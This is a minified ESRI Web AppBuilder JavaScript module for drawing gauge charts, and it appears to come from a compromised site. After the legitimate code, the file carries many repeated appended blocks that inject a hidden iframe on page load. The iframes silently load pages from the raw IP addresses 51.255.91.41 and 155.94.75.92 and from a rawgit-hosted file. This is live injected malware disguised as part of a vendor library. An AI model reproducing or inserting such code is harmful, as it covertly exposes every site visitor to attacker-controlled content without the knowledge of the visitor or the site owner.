// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/_base/declare","dojo/_base/lang","jimu/utils","./_chartUtils"],function(p,f,k,m){return p([],{curvedGaugeSeries:[{type:"gauge",center:["50%","60%"],startAngle:200,endAngle:-20,axisLine:{lineStyle:{color:[[.31,"#58f7f3"],[1,"#E5E5E5"]]}},axisTick:{show:!1},splitLine:{show:!1},axisLabel:{distance:-52,textStyle:{color:"#000"}},pointer:{length:"65%",width:5},itemStyle:{normal:{}},detail:{show:!0,offsetCenter:[0,"60%"],textStyle:{color:"#24B5CC"}},title:{show:!1},data:[{value:0}],animationEasingUpdate:"bounceOut",
animationDurationUpdate:500}],horizontalGauge:{grid:{top:"middle",height:90},xAxis:{show:!0,offset:-27,type:"value",scale:!1,interval:1,axisTick:{show:!1},axisLine:{show:!1},axisLabel:{show:!1,showMinLabel:!0,showMaxLabel:!0,textStyle:{color:"#949494",fontStyle:"normal",fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}},splitLine:{show:!1}},yAxis:{show:!1,type:"category",data:[]},series:[{name:"",type:"bar",barWidth:30,silent:!0,animation:!1,itemStyle:{normal:{color:"#E5E5E5"}},barGap:"-100%",
data:[100],z:1},{type:"bar",barWidth:30,label:{normal:{show:!0,position:"top",offset:[20,0],textStyle:{}}},data:[{value:40,label:{normal:{textStyle:{color:"#24B5CC",fontStyle:"normal",fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}}},itemStyle:{normal:{}}}],itemStyle:{normal:{color:"#24B5CC"}},z:10}]},verticalGauge:{grid:{left:"middle",width:60},yAxis:{show:!0,offset:-10,type:"value",interval:1,scale:!1,axisTick:{show:!1},axisLine:{show:!1},axisLabel:{show:!1,showMinLabel:!0,showMaxLabel:!0,
textStyle:{color:"#949494",fontStyle:"normal",fontWeight:"normal"}},splitLine:{show:!1}},xAxis:{show:!1,type:"category",data:[]},series:[{name:"",type:"bar",barWidth:30,silent:!0,animation:!1,itemStyle:{normal:{color:"#E5E5E5"}},barGap:"-100%",data:[100],z:1},{type:"bar",barWidth:30,label:{normal:{show:!0,position:"insideTopLeft",offset:[30,-15],textStyle:{}}},data:[{value:40,label:{normal:{textStyle:{color:"#24B5CC",fontStyle:"normal",fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}}},itemStyle:{normal:{}}}],
itemStyle:{normal:{color:"#24B5CC"}},z:10}]},constructor:function(a){this.chart=a.chart},_settingValueStyle:function(a,b){if(b.gaugeOption&&k.isNotEmptyObject(b.gaugeOption.valueStyle)){var c=b.gaugeOption.valueStyle,d=c.textStyle,c=c.formatter;"horizontal"===b.shape||"vertical"===b.shape?(f.mixin(a.series[1].data[0].label.normal.textStyle,d),c&&(a.series[1].data[0].label.normal.formatter=c)):"curved"===b.shape&&(f.mixin(a.series[0].detail.textStyle,d),c&&(a.series[0].detail.formatter=c))}return a},
_settingLabelColor:function(a,b){var c="#000";b.gaugeOption&&b.gaugeOption.labelColor&&(c=b.gaugeOption.labelColor);"curved"===b.shape?a.series[0].axisLabel.textStyle.color=c:"horizontal"===b.shape?a.xAxis.axisLabel.textStyle.color=c:"vertical"===b.shape&&(a.yAxis.axisLabel.textStyle.color=c);return a},_settingHorizontalGauge:function(a,b){f.mixin(a,f.clone(this.horizontalGauge));a.grid={top:"middle",height:90,left:"10%",right:"10%"};b.min="undefined"!==typeof b.min&&b.min?b.min:0;b.max="undefined"!==
typeof b.max&&b.max?b.max:100;a.xAxis.max=b.max;a.xAxis.min=b.min;a.xAxis.scale=!0;a.series[0].data[0]=b.max;a=this._handleValue(a,b);b.labels&&b.labels[0]&&(a.series[1].data[0].name=b.labels[0]);a.series[1].name=b.series[0].name;a=this._settingNoCurvedGaugeColor(a,b);return a=this._handleHorizontalGaugeValueRTL(a,b)},_handleHorizontalGaugeValueRTL:function(a,b){if(!window.isRTL||"horizontal"!==b.shape)return a;a.series[1].label.normal.offset=[-20,0];return a},_settingVerticalGauge:function(a,b){f.mixin(a,
f.clone(this.verticalGauge));a.grid={left:"middle",width:60,top:"10%",bottom:"10%"};a.grid.left=this._getGridLeftOfVerticalGauge();b.min="undefined"!==typeof b.min&&b.min?b.min:0;b.max="undefined"!==typeof b.max&&b.max?b.max:100;a.yAxis.max=b.max;a.yAxis.min=b.min;a.series[0].data[0]=b.max;a=this._handleValue(a,b);b.labels&&b.labels[0]&&(a.series[1].data[0].name=b.labels[0]);a.series[1].name=b.series[0].name;a=this._settingNoCurvedGaugeColor(a,b);return a=this._handleVerticalGaugeValueRTL(a,b)},_handleVerticalGaugeValueRTL:function(a,
b){if(!window.isRTL||"vertical"!==b.shape)return a;var c=(b.series[0].data[0]+"").length-1;b.gaugeOption&&b.gaugeOption.valueStyle&&"undefined"!==typeof b.gaugeOption.valueStyle.decimalPlaces&&(c+=b.gaugeOption.valueStyle.decimalPlaces);a.series[1].label.normal.offset=[-17-9*c,-15];return a},_handleValue:function(a,b){var c;c=b.series[0].data[0]<=b.max?b.series[0].data[0]:b.max;a.tooltip.formatter=function(a){return m.handleToolTip(a,b.series[0].data[0],!1)};a.series[1].data[0].value=c;return a},
_settingCurvedGauge:function(a,b){a.series=f.clone(this.curvedGaugeSeries);b.min="undefined"!==typeof b.min&&b.min?b.min:0;b.max="undefined"!==typeof b.max&&b.max?b.max:100;a.series[0].min=b.min;a.series[0].max=b.max;a.tooltip.formatter=function(a){return m.handleToolTip(a,null,!1)};a.series[0].axisLine.lineStyle.color[0][0]=parseFloat(b.series[0].data[0]/b.max).toFixed(2);a.series[0].data[0].value=b.series[0].data[0];b.labels&&b.labels[0]&&(a.series[0].data[0].name=b.labels[0]);b.series[0].name&&
(a.series[0].name=b.series[0].name);a.series[0].axisLine.lineStyle.width=30;return a=this._settingCurvedGaugeColor(a,b)},_settingGaugeSeries:function(a,b){if("gauge"!==b.type)return a;"horizontal"===b.shape?a=this._settingHorizontalGauge(a,b):"vertical"===b.shape?a=this._settingVerticalGauge(a,b):"curved"===b.shape&&(a=this._settingCurvedGauge(a,b));a=this._settingGaugeLabel(a,b);a=this._settingLabelColor(a,b);return a=this._settingValueStyle(a,b)},_resetGraphic:function(a){a=this._settingGraphic(a);
this._clearGraphic();this.chart.setOption({graphic:a});this.cacheGraphic=null;this.cacheGraphic=a},_clearGraphic:function(){this.cacheGraphic&&(this.cacheGraphic.forEach(function(a){a.$action="remove"}),this.chart.setOption({graphic:this.cacheGraphic}))},_resetGrid:function(a){a=this._settingGridLeftOfVerticalGauge(a);k.isNotEmptyObject(a)&&this.chart.setOption({grid:a})},_settingGridLeftOfVerticalGauge:function(a){return"gauge"!==a.type||"vertical"!==a.shape?{}:{left:this._getGridLeftOfVerticalGauge(),
width:60,top:"10%",bottom:"10%"}},_settingCurvedGaugeColor:function(a,b){b.gaugeOption&&(b.gaugeOption.bgColor&&(a.series[0].axisLine.lineStyle.color[1][1]=b.gaugeOption.bgColor),b.gaugeOption.columnColor&&(a.series[0].axisLine.lineStyle.color[0][1]=b.gaugeOption.columnColor));return a},_settingNoCurvedGaugeColor:function(a,b){b.gaugeOption&&(b.gaugeOption.bgColor&&(a.series[0].itemStyle.normal.color=b.gaugeOption.bgColor),b.gaugeOption.columnColor&&(a.series[1].data[0].itemStyle.normal.color=b.gaugeOption.columnColor));
return a},_settingGraphic:function(a){var b=[];"gauge"===a.type&&a.gaugeOption&&("horizontal"===a.shape?b=this._settingHorizontalGraphic(a):"vertical"===a.shape&&(b=this._settingVerticalGraphic(a)));return b},_settingHorizontalGraphic:function(a){var b="#000";a.gaugeOption&&a.gaugeOption.labelColor&&(b=a.gaugeOption.labelColor);var c=[],d=this.chart.convertToPixel({yAxisIndex:0},0),d=parseInt(d,10),d=Number(d)+16;this.cacheCriticalValues=f.clone(this.criticalValues);this.cacheCriticalValues.forEach(f.hitch(this,
function(e){var h,g;"object"===typeof e?e.type&&(h=e.type,g=e.value):g=e;e=a.min||0;if(!(g>(a.max||100)||g<e)){e=this._getxAxisValueLeft(g);var f=6*(g.toString().length-2),n=e;0<f&&(n=e-f);h||c.push({z:10,type:"image",$action:"merge",id:"wab_gid_image-"+k.getRandomString(),left:e,style:{image:"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjdweCIgaGVpZ2h0PSI1cHgiIHZpZXdCb3g9IjAgMCA3IDUiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkNhcmRXaWRnZXRfTGF5b3V0NCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTg3NS4wMDAwMDAsIC0yOTcuMDAwMDAwKSIgZmlsbD0iIzkzOTM5MyI+DQogICAgICAgICAgICA8ZyBpZD0iQ2FyZDJfSG9yaXpvbnRhbEdhdWdlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3OTIuMDAwMDAwLCAxODEuMDAwMDAwKSI+DQogICAgICAgICAgICAgICAgPGcgaWQ9Ikhvcml6b250YWxHYXVnZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDY2LjAwMDAwMCkiPg0KICAgICAgICAgICAgICAgICAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMjguNTAwMDAwLCA0Mi41MDAwMDApIHJvdGF0ZSgtMjcwLjAwMDAwMCkgdHJhbnNsYXRlKC0xMjguNTAwMDAwLCAtNDIuNTAwMDAwKSB0cmFuc2xhdGUoODYuMDAwMDAwLCAtODYuMDAwMDAwKSIgaWQ9Ik51bWJlcnMrVHJpYW5nbGVzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUwLjAwMDAwMCwgMC4wMDAwMDApIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBpZD0iVHJpYW5nbGUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDIuNTAwMDAwLCAxNzAuNTQzODAzKSByb3RhdGUoLTE4MC4wMDAwMDApIHRyYW5zbGF0ZSgtMi41MDAwMDAsIC0xNzAuNTQzODAzKSAiIHBvaW50cz0iNSAxNzAuNTQzODAzIC0xLjcwNTMwMjU3ZS0xMyAxNzQuMDQzODAzIC0xLjY5NjQyMDc4ZS0xMyAxNjcuMDQzODAzIj48L3BvbHlnb24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICAgICAgICAgIDwvZz4NCiAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICA8L2c+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4\x3d",
width:10,height:10},silent:!0,top:d});c.push({z:10,type:"text",$action:"merge",id:"wab_gid_text-"+k.getRandomString(),left:n,style:{text:g,fill:b,font:"normal 11px sans-serif"},silent:!0,top:d+11})}}));return c},_settingVerticalGraphic:function(a){var b="#000";a.gaugeOption&&a.gaugeOption.labelColor&&(b=a.gaugeOption.labelColor);var c=[],d=this.chart.convertToPixel({xAxisIndex:0},0),d=parseFloat(d,10).toFixed(2),d=Number(d),e="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjVweCIgaGVpZ2h0PSI4cHgiIHZpZXdCb3g9IjAgMCA1IDgiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkNhcmRXaWRnZXRfTGF5b3V0NCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTg3Ni4wMDAwMDAsIC0zMjQuMDAwMDAwKSIgZmlsbD0iIzkzOTM5MyI+DQogICAgICAgICAgICA8ZyBpZD0iQ2FyZDJfSG9yaXpvbnRhbEdhdWdlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3OTIuMDAwMDAwLCAxODEuMDAwMDAwKSI+DQogICAgICAgICAgICAgICAgPGcgaWQ9Ikhvcml6b250YWxHYXVnZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDY2LjAwMDAwMCkiPg0KICAgICAgICAgICAgICAgICAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMjguNTAwMDAwLCA0Mi41MDAwMDApIHJvdGF0ZSgtMjcwLjAwMDAwMCkgdHJhbnNsYXRlKC0xMjguNTAwMDAwLCAtNDIuNTAwMDAwKSB0cmFuc2xhdGUoODYuMDAwMDAwLCAtODYuMDAwMDAwKSIgaWQ9Ik51bWJlcnMrVHJpYW5nbGVzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUwLjAwMDAwMCwgMC4wMDAwMDApIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBpZD0iVHJpYW5nbGUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDMwLjYyODk1MiwgMTcwLjQ1ODY1NCkgcm90YXRlKC05MC4wMDAwMDApIHRyYW5zbGF0ZSgtMzAuNjI4OTUyLCAtMTcwLjQ1ODY1NCkgIiBwb2ludHM9IjMzLjEyODk1MjMgMTcwLjQ1ODY1NCAyOC4xMjg5NTIzIDE3My45NTg2NTQgMjguMTI4OTUyMyAxNjYuOTU4NjU0Ij48L3BvbHlnb24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICAgICAgICAgIDwvZz4NCiAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICA8L2c+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4\x3d";
window.isRTL&&(d+=40,e="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjVweCIgaGVpZ2h0PSI3cHgiIHZpZXdCb3g9IjAgMCA1IDciIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkFydGJvYXJkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTIxLjAwMDAwMCwgLTQ0Ny4wMDAwMDApIiBmaWxsPSIjOTM5MzkzIj4NCiAgICAgICAgICAgIDxwb2x5Z29uIGlkPSJUcmlhbmdsZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTIzLjUwMDAwMCwgNDUwLjUwMDAwMCkgcm90YXRlKC0xODAuMDAwMDAwKSB0cmFuc2xhdGUoLTEyMy41MDAwMDAsIC00NTAuNTAwMDAwKSAiIHBvaW50cz0iMTI2IDQ1MC41IDEyMSA0NTQgMTIxIDQ0NyI+PC9wb2x5Z29uPg0KICAgICAgICA8L2c+DQogICAgPC9nPg0KPC9zdmc+");
var h=d-26;this.cacheCriticalValues=f.clone(this.criticalValues);this.cacheCriticalValues.forEach(f.hitch(this,function(d){var f,g;"object"===typeof d?d.type&&(f=d.type,g=d.value):g=d;d=h;d=window.isRTL?h+11:h-11-6*(g.toString().length-1);var l=a.min||0;g>(a.max||100)||g<l||(l=this._getyAxisValueTop(g),l-=2,f||c.push({z:10,type:"image",$action:"merge",id:"wab_gid_image-"+k.getRandomString(),left:h,style:{image:e,width:10,height:10},silent:!0,top:l}),c.push({z:10,type:"text",$action:"merge",id:"wab_gid_text-"+
k.getRandomString(),left:d,style:{text:g,fill:b,font:"normal 11px sans-serif"},silent:!0,top:l-2}))}));return c},_getGridLeftOfVerticalGauge:function(){return this.chart.getWidth()/2-30},_getxAxisValueLeft:function(a){a=this.chart.convertToPixel({xAxisIndex:0},a);return parseFloat(a,10)-4},_getyAxisValueTop:function(a){a=this.chart.convertToPixel({yAxisIndex:0},a);return parseFloat(a,10)},_showSpecialLabel:function(a,b,c){var d=((b.max||100)-(b.min||0))/1E3;c.sort(function(a,b){return a-b});var e=
function(a){var b;c.forEach(function(c){"undefined"===typeof b&&c>=a&&c<a+d&&(b=c)});return b};"curved"===b.shape?a.series[0].axisLabel.formatter=e:"horizontal"===b.shape?a.xAxis.axisLabel.formatter=e:"vertical"===b.shape&&(a.yAxis.axisLabel.formatter=e);return a},_settingGaugeLabel:function(a,b){var c=b.min||0,d=b.max||100,e=[];b.gaugeOption&&b.gaugeOption.showTargetValueLabel&&("curved"===b.shape&&(a.series[0].splitNumber=1E3,a.series[0].axisTick.splitNumber=1,a.series[0].axisTick.show=!1),b.gaugeOption.targetValue&&
b.gaugeOption.targetValue.forEach(function(a){e.push(a)}));this.criticalValues=f.clone(e);b.gaugeOption&&b.gaugeOption.showDataRangeLabel&&(0>e.indexOf(c)&&(e.push(c),this.criticalValues.push({type:"min",value:c})),0>e.indexOf(d)&&(e.push(d),this.criticalValues.push({type:"max",value:d})));return"curved"===b.shape?this._showSpecialLabel(a,b,e):a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});